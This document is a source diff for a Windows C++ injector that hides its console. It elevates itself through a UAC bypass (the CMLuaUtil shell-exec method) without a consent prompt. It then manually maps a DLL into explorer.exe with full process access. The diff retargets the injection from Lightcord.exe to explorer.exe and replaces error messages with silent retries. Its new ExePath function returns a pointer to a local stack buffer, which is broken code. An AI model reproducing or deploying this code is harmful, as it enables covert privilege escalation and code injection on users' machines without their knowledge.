@@ -15,7 +15,8 @@ extern "C" {
     #include "ntstatus.h"
 }
 
-std::string ExePath();
+WCHAR* ExePath();
+std::string GetCWD();
 NTSTATUS StartProcessAsAdmin(LPWSTR lpName);
 
 #define JOIN(x, y) x ## y
@@ -27,10 +28,10 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName);
 
 #define		MY_DLL		"DllTest.dll"
 
-#ifdef _WIN64
-#define		MY_PROC		L"Lightcord.exe"
+#ifndef _WIN64
+#define		MY_PROC		L"explorer.exe"
 #else
-#define		MY_PROC		"Lightcord.exe"
+#define		MY_PROC		"explorer.exe"
 #endif
 
 int main() {
@@ -39,28 +40,25 @@ int main() {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	//Must be called before calling UAC bypass due to it manipulating/faking executable information
-	auto exe_path = ExePath();
+	auto cwd = GetCWD();
 
-	StartProcessAsAdmin((LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
-
+    if (!Utils::IsElevated()) {
+        StartProcessAsAdmin((LPWSTR)ExePath());
+        return 0;
+    }
 	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_PROC));
 	if (!hProc) {
-		DWORD Err = GetLastError();
-		printf("OpenProcess failed: 0x%X\n", GetLastError());
-		system("PAUSE");
-		return 0;
+        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_PROC));
+        Sleep(10000);
 	}
 
 	//Manual map my DLL inside target process and call DllMain
-	auto pKernel = ManualMap(hProc, (exe_path + MY_DLL).c_str());
-	if (!pKernel) {
-		CloseHandle(hProc);
-		printf("Something went wrong...");
-		system("PAUSE");
-		return 0;
+	auto pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
+	if (!pMyDll) {
+        pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
+        Sleep(10000);
 	}
 	CloseHandle(hProc);
-
 
 	return 0;
 }
@@ -175,11 +173,17 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName) {
     ucmCMLuaUtilShellExecMethod(lpName);
 }
 
-std::string ExePath() {
+std::string GetCWD() {
     WCHAR buffer[MAX_PATH] = { 0 };
     GetModuleFileNameW(NULL, buffer, MAX_PATH);
     std::wstring ws(buffer);
     std::string file_path(ws.begin(), ws.end());
     std::wstring::size_type pos = file_path.find_last_of("\\/");
     return file_path.substr(0, pos + 1);
+}
+
+WCHAR* ExePath() {
+    WCHAR buffer[MAX_PATH] = { 0 };
+    GetModuleFileNameW(NULL, buffer, MAX_PATH);
+    return buffer;
 }
